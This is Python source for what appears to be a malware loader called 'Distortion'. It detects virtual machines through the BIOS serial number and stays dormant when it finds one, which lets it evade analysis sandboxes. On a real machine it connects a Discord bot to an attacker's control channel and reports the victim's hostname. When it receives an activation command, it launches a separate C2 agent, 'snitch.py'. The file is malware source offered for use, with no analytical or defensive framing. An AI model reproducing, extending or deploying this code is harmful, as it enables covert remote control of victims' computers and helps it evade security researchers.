import socket
import asyncio

if sys.platform == "win32" and sys.version_info >= (3, 8):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

import requests
import time, random, sys, os
from dotenv import load_dotenv
import subprocess
import discord

def vm():
    try:
        o = subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower()
        if 'virtual' in o or 'vmware' in o or 'vbox' in o:
            return True

        return False

    except Exception as e:
        return False

if not vm():

    load_dotenv()
    BOT_TOKEN = os.getenv("BOT_TOKEN")
    CONTROL_CENTER = "SAME_AS_CONTROL_CENTER_FROM_SNITCH.PY"

    intents = discord.Intents.default()
    intents.message_content = True  # THIS is key to reading messages content
    intents.messages = True 

    listener = discord.Client(intents=intents)

    device_id = socket.gethostname()

    @listener.event
    async def on_ready():
        """Called when the bot logs in and is ready."""
        print(f"[Distortion] Listener online for device: {device_id}")
        print("[Distortion] Awaiting activation command...")
        
        # Optional: Send a ping to announce that this listener is online
        control_channel = listener.get_channel(CONTROL_CENTER)
        if control_channel:
            await control_channel.send(f"distortion `<{device_id}>`")

    @listener.event
    async def on_message(message: discord.Message):

        # Ignore messages from the bot itself or from other bots
        if message.author.bot:
            return

        # Only process messages in the designated control center channel
        if message.channel.id == CONTROL_CENTER:
            
            expected_command = f"$activate <{device_id}>"

            # Check if the message content is the activation command for THIS specific device
            if message.content == expected_command:
                print(f"[Distortion] Activation command received for {device_id}!")
                
                try:
                    # Acknowledge the command before closing the connection
                    await message.channel.send(f"`{device_id}` activated.")
                except discord.errors.Forbidden:
                    print("[Distortion] Warning: Missing permissions to send activation confirmation.")
                
                # This is the crucial step: cleanly close the listener bot's connection.
                # This will cause `client.run()` to stop, and the script will continue.
                await listener.close()

    def run_listener():
        """Runs the discord listener bot."""
        if not BOT_TOKEN:
            print("[Distortion] Error: BOT_TOKEN is not set.")
            return
        
        try:
            # This is a blocking call. It will run until `client.close()` is called.
            listener.run(BOT_TOKEN)
        except discord.errors.LoginFailure:
            print("[Distortion] Error: Improper token passed. Login failed.")
        except Exception as e:
            print(f"[Distortion] An error occurred while running the listener: {e}")

    if __name__ == "__main__":
        # 1. Run the listener and wait for it to be closed by an activation command
        run_listener()

        # 2. Once run_listener() finishes, it means we were activated.
        #    Now, launch the main C2 agent, snitch.py.
        print("[Distortion] Listener terminated. Launching Snitch agent...")
        try:
            # Pass the parent PID so snitch can kill distortion if needed
            parent_pid = os.getpid()
            subprocess.run(["python", "snitch.py", str(parent_pid)])
        except FileNotFoundError:
            print("[Distortion] Error: snitch.py not found. Make sure it's in the same directory.")
        except Exception as e:
            print(f"[Distortion] Failed to launch snitch.py: {e}")

        print("[Distortion] Snitch agent has terminated. Shutting down.")




